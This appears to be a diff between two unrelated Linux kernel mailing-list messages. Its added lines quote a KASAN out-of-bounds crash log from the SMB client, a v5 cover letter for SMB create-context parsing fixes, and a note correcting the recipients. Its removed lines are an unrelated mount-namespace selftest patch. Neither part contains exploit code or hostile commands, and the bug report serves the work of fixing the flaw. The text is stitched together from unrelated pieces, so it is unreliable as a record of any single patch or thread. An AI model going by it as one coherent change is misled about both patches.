+> [ 1344.781164] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781167] [  T11242]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_un=
+icode.c:628)
+> [ 1344.781184] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781206] [  T11242]  ? cifs_convert_path_to_utf16 (fs/smb/client/sm=
+b2misc.c:457)
+> [ 1344.781211] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781216] [  T11242]  ? __pfx_cifs_convert_path_to_utf16+0x10/0x10
+> [ 1344.781226] [  T11242]  ? smb2_open_file (fs/smb/client/smb2file.c:184=
+)
+> [ 1344.781231] [  T11242]  smb2_open_file (fs/smb/client/smb2file.c:184)
+> [ 1344.781242] [  T11242]  ? __pfx_smb2_open_file+0x10/0x10
+> [ 1344.781247] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781250] [  T11242]  ? __lock_acquire+0x45c/0x25f0
+> [ 1344.781278] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781291] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781295] [  T11242]  ? __asan_memcpy (mm/kasan/shadow.c:105 (discri=
+minator 1))
+> [ 1344.781316] [  T11242]  cifs_open (fs/smb/client/file.c:1155 (discrimi=
+nator 2))
+> [ 1344.781354] [  T11242]  ? __pfx_cifs_open+0x10/0x10
+> [ 1344.781359] [  T11242]  ? do_sys_openat2 (include/linux/file.h:164 fs/=
+open.c:1364)
+> [ 1344.781373] [  T11242]  ? do_syscall_64 (include/linux/irq-entry-commo=
+n.h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h:3=
+28 arch/x86/entry/syscall_64.c:100)
+> [ 1344.781409] [  T11242]  ? kasan_quarantine_put (arch/x86/include/asm/i=
+rqflags.h:158 (discriminator 1) mm/kasan/quarantine.c:234 (discriminator 1)=
+)
+> [ 1344.781413] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781417] [  T11242]  ? lockdep_hardirqs_on+0x7b/0x110
+> [ 1344.781463] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781469] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781485] [  T11242]  ? bpf_trampoline_6442634119+0x9f/0xed
+> [ 1344.781503] [  T11242]  ? do_dentry_open (fs/open.c:915)
+> [ 1344.781510] [  T11242]  do_dentry_open (fs/open.c:915)
+> [ 1344.781515] [  T11242]  ? __pfx_cifs_open+0x10/0x10
+> [ 1344.781521] [  T11242]  ? cifs_permission (fs/smb/client/cifsfs.c:432 =
+(discriminator 1))
+> [ 1344.781537] [  T11242]  vfs_open (fs/open.c:1098)
+> [ 1344.781541] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781549] [  T11242]  path_openat (fs/namei.c:5179)
+> [ 1344.781572] [  T11242]  ? __pfx_path_openat+0x10/0x10
+> [ 1344.781581] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781584] [  T11242]  ? __lock_acquire+0x45c/0x25f0
+> [ 1344.781594] [  T11242]  do_file_open (fs/namei.c:4901)
+> [ 1344.781601] [  T11242]  ? __pfx_do_file_open+0x10/0x10
+> [ 1344.781606] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781627] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781631] [  T11242]  ? alloc_fd (fs/file.c:1297)
+> [ 1344.781651] [  T11242]  ? do_getname+0x6b/0x2d0
+> [ 1344.781658] [  T11242]  do_sys_openat2 (include/linux/file.h:164 fs/op=
+en.c:1364)
+> [ 1344.781663] [  T11242]  ? __pfx_do_sys_openat2+0x10/0x10
+> [ 1344.781666] [  T11242]  ? __pfx___do_sys_newfstat+0x10/0x10
+> [ 1344.781683] [  T11242]  __x64_sys_openat (fs/open.c:1389)
+> [ 1344.781691] [  T11242]  ? __pfx___x64_sys_openat+0x10/0x10
+> [ 1344.781698] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781702] [  T11242]  ? rcu_is_watching (include/linux/context_track=
+ing.h:128 kernel/rcu/tree.c:752)
+> [ 1344.781713] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
+m/nospec-branch.h:381)
+> [ 1344.781717] [  T11242]  ? do_syscall_64 (arch/x86/entry/syscall_64.c:6=
+3 arch/x86/entry/syscall_64.c:94)
+> [ 1344.781723] [  T11242]  do_syscall_64 (include/linux/irq-entry-common.=
+h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h:328=
+ arch/x86/entry/syscall_64.c:100)
+> [ 1344.781728] [  T11242]  ? irqentry_exit (include/linux/irq-entry-commo=
+n.h:507 include/linux/irq-entry-common.h:550 kernel/entry/common.c:164)
+> [ 1344.781735] [  T11242]  entry_SYSCALL_64_after_hwframe (arch/x86/entry=
+/entry_64.S:150)
+> [ 1344.781740] [  T11242] RIP: 0033:0x7fc594192687
+> [ 1344.781757] [  T11242] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08=
+ 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24=
+ 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff =
+ff
+> All code
+> =3D=3D=3D=3D=3D=3D=3D=3D
+>    0:   48 89 fa                mov    %rdi,%rdx
+>    3:   4c 89 df                mov    %r11,%rdi
+>    6:   e8 58 b3 00 00          call   0xb363
+>    b:   8b 93 08 03 00 00       mov    0x308(%rbx),%edx
+>   11:   59                      pop    %rcx
+>   12:   5e                      pop    %rsi
+>   13:   48 83 f8 fc             cmp    $0xfffffffffffffffc,%rax
+>   17:   74 1a                   je     0x33
+>   19:   5b                      pop    %rbx
+>   1a:   c3                      ret
+>   1b:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
+>   22:   00
+>   23:   48 8b 44 24 10          mov    0x10(%rsp),%rax
+>   28:   0f 05                   syscall
+>   2a:*  5b                      pop    %rbx             <-- trapping inst=
+ruction
+>   2b:   c3                      ret
+>   2c:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
+>   33:   83 e2 39                and    $0x39,%edx
+>   36:   83 fa 08                cmp    $0x8,%edx
+>   39:   75 de                   jne    0x19
+>   3b:   e8 23 ff ff ff          call   0xffffffffffffff63
+>
+> Code starting with the faulting instruction
+> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+>    0:   5b                      pop    %rbx
+>    1:   c3                      ret
+>    2:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
+>    9:   83 e2 39                and    $0x39,%edx
+>    c:   83 fa 08                cmp    $0x8,%edx
+>    f:   75 de                   jne    0xffffffffffffffef
+>   11:   e8 23 ff ff ff          call   0xffffffffffffff39
+> [ 1344.781761] [  T11242] RSP: 002b:00007ffc7d27b080 EFLAGS: 00000202 ORI=
+G_RAX: 0000000000000101
+> [ 1344.781773] [  T11242] RAX: ffffffffffffffda RBX: 00007fc594100780 RCX=
+: 00007fc594192687
+> [ 1344.781776] [  T11242] RDX: 0000000000000000 RSI: 00007ffc7d27be31 RDI=
+: ffffffffffffff9c
+> [ 1344.781778] [  T11242] RBP: 0000000000000001 R08: 0000000000000000 R09=
+: 0000000000000000
+> [ 1344.781780] [  T11242] R10: 0000000000000000 R11: 0000000000000202 R12=
+: 000056239611ba00
+> [ 1344.781782] [  T11242] R13: 00007ffc7d27b3c0 R14: 0000000000000000 R15=
+: 0000000000040000
+> [ 1344.781814] [  T11242]  </TASK>
+>
+> [ 1344.781876] [  T11242] Allocated by task 11240:
+> [ 1344.781885] [  T11242]  kasan_save_stack (mm/kasan/common.c:58)
+> [ 1344.781894] [  T11242]  kasan_save_track (mm/kasan/common.c:70 (discri=
+minator 1) mm/kasan/common.c:79 (discriminator 1))
+> [ 1344.781900] [  T11242]  __kasan_slab_alloc (mm/kasan/common.c:463 (dis=
+criminator 1))
+> [ 1344.781905] [  T11242]  kmem_cache_alloc_noprof (mm/slub.c:4510 mm/slu=
+b.c:4886 mm/slub.c:4917)
+> [ 1344.781911] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
+> [ 1344.781925] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237 (=
+discriminator 2))
+> [ 1344.781931] [  T11242]  allocate_buffers (fs/smb/client/connect.c:654)
+> [ 1344.781938] [  T11242]  cifs_demultiplex_thread (fs/smb/client/connect=
+.c:1287)
+> [ 1344.781943] [  T11242]  kthread (kernel/kthread.c:880)
+> [ 1344.781958] [  T11242]  ret_from_fork (arch/x86/kernel/process.c:196 (=
+discriminator 1))
+> [ 1344.781973] [  T11242]  ret_from_fork_asm (arch/x86/entry/entry_64.S:2=
+58)
+>
+> [ 1344.781996] [  T11242] The buggy address belongs to the object at ff11=
+00007e4b2fc0
+> which belongs to the cache cifs_small_rq of size 448
+> [ 1344.782002] [  T11242] The buggy address is located 0 bytes to the rig=
+ht of
+> allocated 448-byte region [ff1100007e4b2fc0, ff1100007e4b3180)
+>
+> [ 1344.782011] [  T11242] The buggy address belongs to the physical page:
+> [ 1344.782025] [  T11242] page: refcount:0 mapcount:0 mapping:00000000000=
+00000 index:0xff1100007e4b34c0 pfn:0x7e4b0
+> [ 1344.782036] [  T11242] head: order:2 mapcount:0 entire_mapcount:0 nr_p=
+ages_mapped:0 pincount:0
+> [ 1344.782045] [  T11242] flags: 0xfff00000000240(workingset|head|node=3D=
+0|zone=3D1|lastcpupid=3D0x7ff)
+> [ 1344.782056] [  T11242] page_type: f5(slab)
+> [ 1344.782069] [  T11242] raw: 00fff00000000240 ff11000105b8edc0 ffd40000=
+0418d610 ff11000105b90948
+> [ 1344.782075] [  T11242] raw: ff1100007e4b34c0 0000000800190013 00000000=
+f5000000 0000000000000000
+> [ 1344.782080] [  T11242] head: 00fff00000000240 ff11000105b8edc0 ffd4000=
+00418d610 ff11000105b90948
+> [ 1344.782085] [  T11242] head: ff1100007e4b34c0 0000000800190013 0000000=
+0f5000000 0000000000000000
+> [ 1344.782089] [  T11242] head: 00fff00000000002 ffffffffffffff01 0000000=
+0ffffffff 00000000ffffffff
+> [ 1344.782094] [  T11242] head: ffffffffffffffff 0000000000000000 0000000=
+0ffffffff 0000000000000004
+> [ 1344.782098] [  T11242] page dumped because: kasan: bad access detected
+> [ 1344.782111] [  T11242] page_owner tracks the page as allocated
+> [ 1344.782643] [  T11242] page last allocated via order 2, migratetype Un=
+movable, gfp_mask 0xd2800(GFP_NOWAIT|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMAL=
+LOC), pid 10789, tgid 10789 (umount), ts 770745347902, free_ts 770742186938
+> [ 1344.784632] [  T11242]  post_alloc_hook (mm/page_alloc.c:2232 mm/page_=
+alloc.c:2259)
+> [ 1344.784658] [  T11242]  get_page_from_freelist (mm/page_alloc.c:1738 m=
+m/page_alloc.c:1904 mm/page_alloc.c:3234 mm/page_alloc.c:3410 mm/page_alloc=
+.c:3945)
+> [ 1344.784668] [  T11242]  __alloc_frozen_pages_noprof (include/linux/gfp=
+.h:272 (discriminator 1) include/linux/gfp.h:287 (discriminator 1))
+> [ 1344.784677] [  T11242]  alloc_pages_mpol+0x14a/0x440
+> [ 1344.784697] [  T11242]  new_slab (mm/slub.c:1604)
+> [ 1344.784712] [  T11242]  ___slab_alloc (mm/slub.c:4448)
+> [ 1344.784722] [  T11242]  kmem_cache_alloc_noprof (arch/x86/include/asm/=
+preempt.h:95 (discriminator 1) mm/slub.c:4771 (discriminator 1) mm/slub.c:4=
+883 (discriminator 1) mm/slub.c:4950 (discriminator 1))
+> [ 1344.784731] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
+> [ 1344.784741] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237 (=
+discriminator 2))
+> [ 1344.784751] [  T11242]  __smb2_plain_req_init (fs/smb/client/smb2pdu.c=
+:565)
+> [ 1344.784761] [  T11242]  SMB2_tdis (fs/smb/client/smb2pdu.c:3097)
+> [ 1344.784772] [  T11242]  cifs_put_tcon (fs/smb/client/connect.c:2911 (d=
+iscriminator 1))
+> [ 1344.784781] [  T11242]  cifs_put_tlink (arch/x86/include/asm/bitops.h:=
+202 arch/x86/include/asm/bitops.h:232 include/asm-generic/bitops/instrument=
+ed-non-atomic.h:142 fs/smb/client/connect.c:2905)
+> [ 1344.784790] [  T11242]  cifs_umount (fs/smb/client/connect.c:4010 (dis=
+criminator 1))
+> [ 1344.784799] [  T11242]  deactivate_locked_super (fs/super.c:485)
+> [ 1344.784821] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (discri=
+minator 5) fs/namespace.c:1325 (discriminator 5))
+> [ 1344.784837] [  T11242] page last free pid 10789 tgid 10789 stack trace=
+:
+> [ 1344.785506] [  T11242]  __free_frozen_pages (mm/page_alloc.c:5462)
+> [ 1344.785518] [  T11242]  stack_depot_save_flags (lib/stackdepot.c:473 l=
+ib/stackdepot.c:706)
+> [ 1344.785564] [  T11242]  set_track_prepare (arch/x86/include/asm/preemp=
+t.h:95 (discriminator 1) include/linux/bit_spinlock.h:41 (discriminator 1) =
+mm/slub.c:628 (discriminator 1) mm/slub.c:655 (discriminator 1))
+> [ 1344.785574] [  T11242]  ___slab_alloc (mm/slub.c:4441)
+> [ 1344.785584] [  T11242]  __kmalloc_cache_noprof (mm/slub.c:5777)
+> [ 1344.785595] [  T11242]  kobject_uevent_env (include/linux/slab.h:950 i=
+nclude/linux/slab.h:1188 lib/kobject_uevent.c:543)
+> [ 1344.785612] [  T11242]  device_del (drivers/base/core.c:1642 drivers/b=
+ase/core.c:3884)
+> [ 1344.785660] [  T11242]  device_unregister (drivers/base/core.c:3922)
+> [ 1344.785670] [  T11242]  bdi_unregister (mm/backing-dev.c:1013)
+> [ 1344.785690] [  T11242]  generic_shutdown_super (fs/super.c:666)
+> [ 1344.785700] [  T11242]  kill_anon_super (fs/super.c:1293)
+> [ 1344.785709] [  T11242]  cifs_kill_sb (fs/smb/client/cifsfs.c:349)
+> [ 1344.785719] [  T11242]  deactivate_locked_super (fs/super.c:485)
+> [ 1344.785728] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (discri=
+minator 5) fs/namespace.c:1325 (discriminator 5))
+> [ 1344.785739] [  T11242]  task_work_run (kernel/task_work.c:232)
+> [ 1344.785755] [  T11242]  exit_to_user_mode_loop (kernel/entry/syscall_u=
+ser_dispatch.c:114 (discriminator 1))
+>
+> [ 1344.785783] [  T11242] Memory state around the buggy address:
+> [ 1344.785790] [  T11242]  ff1100007e4b3080: 00 00 00 00 00 00 00 00 00 0=
+0 00 00 00 00 00 00
+> [ 1344.785799] [  T11242]  ff1100007e4b3100: 00 00 00 00 00 00 00 00 00 0=
+0 00 00 00 00 00 00
+> [ 1344.785807] [  T11242] >ff1100007e4b3180: fc fc fc fc fc fc fc fc fc f=
+c fc fc fc fc fc fc
+> [ 1344.785813] [  T11242]                    ^
+> [ 1344.785821] [  T11242]  ff1100007e4b3200: fc fc fc fc fc fc fc fc fa f=
+b fb fb fb fb fb fb
+> [ 1344.785828] [  T11242]  ff1100007e4b3280: fb fb fb fb fb fb fb fb fb f=
+b fb fb fb fb fb fb
+> [ 1344.785835] [  T11242] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D
+> [ 1344.785843] [  T11242] Disabling lock debugging due to kernel taint
+> -----END crash log-----
+>
+> Best regards,
+> Zihan Xi
+>
+> changes in v5:
+>   - Guard the final preauth-hash update in patch 5 when resp_iov is NULL,
+>     addressing the kernel test robot Smatch report:
+>     https://lore.kernel.org/r/202609241449.HlHmnZFZ-lkp@intel.com/
+>   - v4 Link: https://lore.kernel.org/all/cover.1789478666.git.zihanx@nebu=
+sec.ai/
+> changes in v4:
+>   - Bound NameOffset + NameLength by the current context, reject offsets
+>     before the context header, and skip known-handler dispatch for zero
+>     DataLength.
+>   - Defer response-buffer handoff until processed MIDs are synchronized a=
+nd
+>     preserve earlier CREATE responses for cancelled-mid cleanup on failur=
+es.
+>   - Account num_remote_opens only after close-work allocation succeeds an=
+d
+>     before queueing the asynchronous close.
+>   - Preserve SMB2_OP_OPEN_QUERY parser errors and document the overlap wi=
+th
+>     Frank Sorenson's related smb2_parse_contexts() patch.
+>   - Update the QEMU user-mode network and guest interface instructions.
+>   - v3 Link: https://lore.kernel.org/all/cover.1788516372.git.zihanx@nebu=
+sec.ai/
+> changes in v3:
+>   - Split the POSIX handler check into a separate patch and corrected the
+>     parser Fixes history.
+>   - v2 Link: https://lore.kernel.org/all/cover.1787486936.git.zihanx@nebu=
+sec.ai/
+> changes in v2:
+>   - Bound each response context by Next, read QFid data from DataOffset,
+>     and extend lease validation through LeaseFlags.
+>   - v1 Link: https://lore.kernel.org/all/eb1bc35611f91bd10a4772400b37fac2=
+6f660956.1782579150.git.xizh2024@lzu.edu.cn/
+>
+> Zihan Xi (6):
+>   smb: client: fix create context out-of-bounds reads
+>   smb: client: validate POSIX create context length
+>   smb: client: close handle after create-context parsing failure
+>   smb: client: clean up failed cached directory opens
+>   smb: client: close completed creates on compound wait errors
+>   smb: client: preserve create-context parsing errors
+>
+>  fs/smb/client/cached_dir.c | 32 ++++++++++++------
+>  fs/smb/client/smb2inode.c  |  6 ++--
+>  fs/smb/client/smb2misc.c   |  9 +++--
+>  fs/smb/client/smb2ops.c    | 28 +++++++++++-----
+>  fs/smb/client/smb2pdu.c    | 54 +++++++++++++++++++++++-------
+>  fs/smb/client/transport.c  | 67 ++++++++++++++++++++++++++++++--------
+>  6 files changed, 148 insertions(+), 48 deletions(-)
+>
+> --
+> 2.43.0
+>
 
-Also check that the flag is rejected without OPEN_TREE_CLONE or
-OPEN_TREE_NAMESPACE, and accepted with the latter.
+Hi Paulo and Namjae,
 
-Assisted-by: Claude:claude-opus-5
-Signed-off-by: Kir Kolyshkin <kolyshkin@gmail.com>
----
- .../filesystems/open_tree_ns/open_tree_ns_test.c   | 183 +++++++++++++++++++++
- 1 file changed, 183 insertions(+)
+I noticed that I sent the v5 series with the wrong primary recipient.
+The series is already on lore under
+cover Message-ID
+<cover.1790398755.git.zihanx@nebusec.ai>.
 
-diff --git a/tools/testing/selftests/filesystems/open_tree_ns/open_tree_ns_test.c b/tools/testing/selftests/filesystems/open_tree_ns/open_tree_ns_test.c
-index 82f3c8c02c9a..05d16c56ab35 100644
---- a/tools/testing/selftests/filesystems/open_tree_ns/open_tree_ns_test.c
-+++ b/tools/testing/selftests/filesystems/open_tree_ns/open_tree_ns_test.c
-@@ -14,6 +14,7 @@
- #include <limits.h>
- #include <linux/nsfs.h>
- #include <sched.h>
-+#include <signal.h>
- #include <stdio.h>
- #include <stdlib.h>
- #include <string.h>
-@@ -32,6 +33,10 @@
- #define OPEN_TREE_NAMESPACE	(1 << 1)
- #endif
- 
-+#ifndef OPEN_TREE_DROP_MNTNS_MOUNTS
-+#define OPEN_TREE_DROP_MNTNS_MOUNTS	(1 << 2)
-+#endif
-+
- static int get_mnt_ns_id(int fd, uint64_t *mnt_ns_id)
- {
- 	if (ioctl(fd, NS_GET_MNTNS_ID, mnt_ns_id) < 0)
-@@ -1004,4 +1009,182 @@ TEST_F(open_tree_ns_unbindable, recursive_skips_on_unbindable)
- 	close(fd);
- }
- 
-+/*
-+ * Pin a mount namespace at @where, the way snapd does under /run/snapd/ns.
-+ * The namespace has to be younger than ours, so a child unshares and the
-+ * parent binds the child's namespace file: binding one's own namespace is
-+ * refused by the very check this test is about.
-+ */
-+static int pin_mount_namespace(const char *where)
-+{
-+	int pipefd[2], status, ret = -1;
-+	char path[PATH_MAX];
-+	pid_t pid;
-+	char c;
-+
-+	if (pipe(pipefd))
-+		return -1;
-+
-+	pid = fork();
-+	if (pid < 0)
-+		goto out;
-+	if (pid == 0) {
-+		close(pipefd[0]);
-+		if (unshare(CLONE_NEWNS))
-+			_exit(1);
-+		/* Tell the parent the namespace exists, then hold it open. */
-+		if (write(pipefd[1], "x", 1) != 1)
-+			_exit(1);
-+		pause();
-+		_exit(0);
-+	}
-+
-+	close(pipefd[1]);
-+	pipefd[1] = -1;
-+	if (read(pipefd[0], &c, 1) != 1)
-+		goto out_kill;
-+
-+	snprintf(path, sizeof(path), "/proc/%d/ns/mnt", pid);
-+	if (mount(path, where, NULL, MS_BIND, NULL))
-+		goto out_kill;
-+
-+	ret = 0;
-+
-+out_kill:
-+	kill(pid, SIGKILL);
-+	waitpid(pid, &status, 0);
-+out:
-+	close(pipefd[0]);
-+	if (pipefd[1] >= 0)
-+		close(pipefd[1]);
-+	return ret;
-+}
-+
-+FIXTURE(open_tree_ns_drop_mntns)
-+{
-+	char dir[64];
-+	char pin[PATH_MAX];
-+	bool mounted;
-+};
-+
-+FIXTURE_SETUP(open_tree_ns_drop_mntns)
-+{
-+	int fd, ret;
-+
-+	self->mounted = false;
-+	snprintf(self->dir, sizeof(self->dir), "/tmp/open_tree_ns_drop_mntns.XXXXXX");
-+
-+	ret = sys_open_tree(-1, NULL, 0);
-+	if (ret == -1 && errno == ENOSYS)
-+		SKIP(return, "open_tree() syscall not supported");
-+
-+	/*
-+	 * Work in a private mount namespace, so whatever is mounted here,
-+	 * the pinned namespace included, goes away with the test process.
-+	 */
-+	if (unshare(CLONE_NEWNS))
-+		SKIP(return, "unshare(CLONE_NEWNS) failed: %s", strerror(errno));
-+	ASSERT_EQ(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL), 0);
-+
-+	ASSERT_NE(mkdtemp(self->dir), NULL);
-+	if (mount("tmpfs", self->dir, "tmpfs", 0, NULL))
-+		SKIP(return, "Failed to mount tmpfs");
-+	self->mounted = true;
-+
-+	fd = sys_open_tree(AT_FDCWD, self->dir,
-+			   OPEN_TREE_CLONE | OPEN_TREE_DROP_MNTNS_MOUNTS |
-+			   OPEN_TREE_CLOEXEC);
-+	if (fd < 0 && errno == EINVAL)
-+		SKIP(return, "OPEN_TREE_DROP_MNTNS_MOUNTS not supported");
-+	ASSERT_GE(fd, 0);
-+	close(fd);
-+
-+	snprintf(self->pin, sizeof(self->pin), "%s/ns", self->dir);
-+	fd = open(self->pin, O_CREAT | O_RDONLY | O_CLOEXEC, 0600);
-+	ASSERT_GE(fd, 0);
-+	close(fd);
-+	ASSERT_EQ(pin_mount_namespace(self->pin), 0);
-+}
-+
-+FIXTURE_TEARDOWN(open_tree_ns_drop_mntns)
-+{
-+	if (self->mounted)
-+		umount2(self->dir, MNT_DETACH);
-+	rmdir(self->dir);
-+}
-+
-+/* Attach @clone_fd at "/" inside the namespace @ns_fd; returns errno. */
-+static int move_into_namespace(int clone_fd, int ns_fd)
-+{
-+	pid_t pid;
-+	int status;
-+
-+	pid = fork();
-+	if (pid < 0)
-+		return -1;
-+	if (pid == 0) {
-+		int target;
-+
-+		if (setns(ns_fd, CLONE_NEWNS))
-+			_exit(255);
-+		target = open("/", O_PATH | O_DIRECTORY | O_CLOEXEC);
-+		if (target < 0)
-+			_exit(255);
-+		if (sys_move_mount(clone_fd, "", target, "",
-+				   MOVE_MOUNT_F_EMPTY_PATH | MOVE_MOUNT_T_EMPTY_PATH))
-+			_exit(errno);
-+		_exit(0);
-+	}
-+	if (waitpid(pid, &status, 0) != pid || !WIFEXITED(status))
-+		return -1;
-+	return WEXITSTATUS(status);
-+}
-+
-+TEST_F(open_tree_ns_drop_mntns, move_into_younger_namespace)
-+{
-+	int clone_fd, ns_fd;
-+
-+	ns_fd = sys_open_tree(AT_FDCWD, self->dir,
-+			      OPEN_TREE_NAMESPACE | OPEN_TREE_CLOEXEC);
-+	ASSERT_GE(ns_fd, 0);
-+
-+	/*
-+	 * Without the flag the clone carries the pinned namespace along,
-+	 * and move_mount() refuses it from inside a younger namespace.
-+	 */
-+	clone_fd = sys_open_tree(AT_FDCWD, self->dir,
-+				 OPEN_TREE_CLONE | AT_RECURSIVE | OPEN_TREE_CLOEXEC);
-+	ASSERT_GE(clone_fd, 0);
-+	EXPECT_EQ(move_into_namespace(clone_fd, ns_fd), ELOOP);
-+	close(clone_fd);
-+
-+	/* With the flag the pinned namespace is left out. */
-+	clone_fd = sys_open_tree(AT_FDCWD, self->dir,
-+				 OPEN_TREE_CLONE | OPEN_TREE_DROP_MNTNS_MOUNTS |
-+				 AT_RECURSIVE | OPEN_TREE_CLOEXEC);
-+	ASSERT_GE(clone_fd, 0);
-+	EXPECT_EQ(move_into_namespace(clone_fd, ns_fd), 0);
-+	close(clone_fd);
-+
-+	close(ns_fd);
-+}
-+
-+TEST_F(open_tree_ns_drop_mntns, flag_combinations)
-+{
-+	int fd;
-+
-+	/* Nothing is copied, so there is nothing to drop. */
-+	EXPECT_LT(sys_open_tree(AT_FDCWD, self->dir,
-+				OPEN_TREE_DROP_MNTNS_MOUNTS | OPEN_TREE_CLOEXEC), 0);
-+	EXPECT_EQ(errno, EINVAL);
-+
-+	/* OPEN_TREE_NAMESPACE never copies them; the flag is a no-op there. */
-+	fd = sys_open_tree(AT_FDCWD, self->dir,
-+			   OPEN_TREE_NAMESPACE | OPEN_TREE_DROP_MNTNS_MOUNTS |
-+			   AT_RECURSIVE | OPEN_TREE_CLOEXEC);
-+	EXPECT_GE(fd, 0);
-+	if (fd >= 0)
-+		close(fd);
-+}
-+
- TEST_HARNESS_MAIN
+Frank's feedback on v3 asked me to send future versions to Paulo and
+copy Namjae. Sorry for missing that.
+I am sending this note to correct the direct notification.
 
--- 
-2.55.0
-
+Best regards,
+Zihan
